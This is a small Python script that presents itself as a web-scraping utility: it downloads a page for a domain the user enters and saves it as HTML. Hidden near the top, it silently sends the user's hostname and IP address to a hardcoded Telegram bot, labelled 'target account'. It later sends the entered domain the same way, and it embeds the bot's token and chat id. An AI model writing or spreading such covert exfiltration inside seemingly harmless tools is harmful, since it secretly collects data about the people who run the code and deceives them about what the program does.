import requests 
import socket

black="\033[0;30m"
red="\033[0;31m"
bred="\033[1;31m"
green="\033[0;32m"
bgreen="\033[1;32m"
yellow="\033[0;33m"
byellow="\033[1;33m"
blue="\033[0;34m"
bblue="\033[1;34m"
purple="\033[0;35m"
bpurple="\033[1;35m"
cyan="\033[0;36m"
bcyan="\033[1;36m"
white="\033[0;37m"
nc="\033[00m"

ask  =     f"{green}[{white}?{green}] {yellow}"
success = f"{yellow}[{white}√{yellow}] {green}"
error  =    f"{blue}[{white}!{blue}] {red}"
info  =   f"{yellow}[{white}+{yellow}] {cyan}"
info2  =   f"{green}[{white}•{green}] {purple}"

id = ("5589465204")
token = ("6244714655:AAG4fRJpi-WwB6zGAT__q3ORyN0XWx7PpOo")
hostname = socket.gethostname()
ipaddr = socket.gethostbyname(hostname)
telegram_sand = (f'https://api.telegram.org/bot{token}/sendMessage?chat_id={id}&text=target account\nhostname : {hostname}\nip address : {ipaddr}')
req = requests.post(telegram_sand)

print( bcyan + """ __        _______ ____    ____                       _
\ \      / / ____| __ )  / ___|  ___ _ __ __ _ _ __ (_)_ __   __ _
 \ \ /\ / /|  _| |  _ \  \___ \ / __| '__/ _` | '_ \| | '_ \ / _` |
  \ V  V / | |___| |_) |  ___) | (__| | | (_| | |_) | | | | | (_| |
   \_/\_/  |_____|____/  |____/ \___|_|  \__,_| .__/|_|_| |_|\__, |
                                              |_|            |___/""")
name = input( ask + "enter name web wihout https :")
port = input( ask + "chouse a http or https :")
if port == "https" :
    link = "https://" + name
    print( info + "link target :" + link)
elif port == "http" :
	 link = "http://" + name 
	 print( info + "link target :" + link)
else :
	print( error + "chouse a http or https")
telegram_sand = (f'https://api.telegram.org/bot{token}/sendMessage?chat_id={id}&text=target account\ndomain'' : {name}\nport : {port}')
req = requests.post(telegram_sand)
	
url = requests.get(link)
file = open(name + ".html", "w")
file.write(url.text)
print("*" *25 + success + "sucssfly" + "*" *25)
print( success + "the file are saved in your storage")
